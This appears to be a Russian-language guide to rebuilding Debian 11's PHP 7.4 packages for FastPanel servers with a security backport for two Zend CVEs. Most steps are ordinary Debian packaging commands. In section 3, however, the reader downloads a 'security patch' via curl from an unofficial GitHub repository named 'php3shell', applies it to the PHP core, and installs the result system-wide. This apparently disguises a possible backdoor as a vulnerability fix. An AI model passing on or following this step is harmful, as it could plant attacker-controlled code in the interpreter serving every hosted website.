# Руководство по сборке и обновлению PHP 7.4 (Debian 11 Bullseye / FastPanel)

Данное руководство описывает процесс нативной сборки и обновления системного PHP 7.4 (`php7.4-cli`, `php7.4-fpm`, `libapache2-mod-php7.4` и модулей) на **Debian 11 (Bullseye)** с применением бэкпорта безопасности против критических уязвимостей **CVE-2026-109618** и **CVE-2026-109619** (нарушение целостности памяти при OOM/bailout в ядре Zend).

---

## 1. Особенности PHP 7.4 в Debian 11 Bullseye

В FastPanel на Debian 11 версия PHP 7.4 не устанавливается в `/opt/php74`, а используется напрямую из официальных репозиториев системы Debian (`php7.4-fpm`, `php7.4-cli` и т.д.).

Для сохранения 100% совместимости с FastPanel, пакетным менеджером `apt` и установленными сайтами сборка производится в виде **нативных `.deb` пакетов Debian** с сохранением оригинальных пулов, сокетов и конфигураций.

---

## 2. Подготовка сборочного окружения

1. Включаем репозитории исходных кодов `deb-src` в `/etc/apt/sources.list`:
```bash
# Проверяем наличие deb-src bullseye main
grep -q "^deb-src.*bullseye main" /etc/apt/sources.list || echo "deb-src http://deb.debian.org/debian bullseye main" >> /etc/apt/sources.list
grep -q "^deb-src.*bullseye-security" /etc/apt/sources.list || echo "deb-src http://security.debian.org/debian-security bullseye-security main" >> /etc/apt/sources.list
grep -q "^deb-src.*bullseye-updates" /etc/apt/sources.list || echo "deb-src http://deb.debian.org/debian bullseye-updates main" >> /etc/apt/sources.list

apt-get update
```

2. Устанавливаем инструменты сборки Debian-пакетов:
```bash
apt-get install -y dpkg-dev devscripts build-essential screen
```

3. Скачиваем официальные исходные коды PHP 7.4 из репозиториев Debian:
```bash
mkdir -p /usr/src/deb-php74
cd /usr/src/deb-php74
apt-get source php7.4
apt-get build-dep -y php7.4
```

---

## 3. Применение патча безопасности

Переходим в каталог распакованных исходников:
```bash
cd /usr/src/deb-php74/php7.4-7.4.33
```

Скачиваем адаптированный под Debian 11 патч:
```bash
curl -sSL "https://raw.githubusercontent.com/avego/php3shell/main/patch/php-7.4.33-debian11-cve-2026-109618-109619.patch" -o /tmp/php74-deb11.patch
patch -p1 < /tmp/php74-deb11.patch
rm -f /tmp/php74-deb11.patch
```

Проверяем наличие добавленных функций защиты в коде ядра:
```bash
grep -i "memory_hard_limit_percent" main/main.c
```

Добавляем запись о версии с патчем в `debian/changelog`:
```bash
dch -l "+cve" "Fix CVE-2026-109618 and CVE-2026-109619: bailout state corruption"
```

---

## 4. Сборка нативных deb-пакетов

Запускаем сборку (рекомендуется внутри утилиты `screen`, процесс занимает 15–20 минут):
```bash
screen -S phpbuild
cd /usr/src/deb-php74/php7.4-7.4.33
dpkg-buildpackage -us -uc -b -j$(nproc)
```
*(Для отключения от screen нажмите `Ctrl + A`, затем `D`. Для возврата — `screen -r phpbuild`)*

---

## 5. Установка обновленных пакетов и перезапуск

После завершения сборки переходим в каталог с готовыми `.deb` файлами:
```bash
cd /usr/src/deb-php74

# Формируем список только тех собранных пакетов, которые реально установлены в системе:
TO_INSTALL=""
for deb in $(ls php7.4*.deb libapache2-mod-php7.4*.deb 2>/dev/null | grep -v -- '-dbgsym'); do
    pkg_name=$(dpkg-deb -f "$deb" Package)
    if dpkg -l "$pkg_name" 2>/dev/null | grep -q '^ii'; then
        TO_INSTALL="$TO_INSTALL $deb"
    fi
done

# Устанавливаем обновленные пакеты:
dpkg -i $TO_INSTALL

# Перезапускаем веб-сервер и FPM:
systemctl restart php7.4-fpm
systemctl restart apache2
```

---

## 6. Проверка результата

1. Проверяем наличие новой директивы ядра PHP:
```bash
php7.4 -i | grep memory_hard_limit_percent
```
*Вывод:*
```
memory_hard_limit_percent => no value => no value
```

2. Проверяем статус пулов сайтов FastPanel:
```bash
systemctl status php7.4-fpm --no-pager
```

3. Проверяем версии установленных пакетов в базе `dpkg`:
```bash
dpkg -l | grep '7.4.33-1+deb11u12+cve1'
```
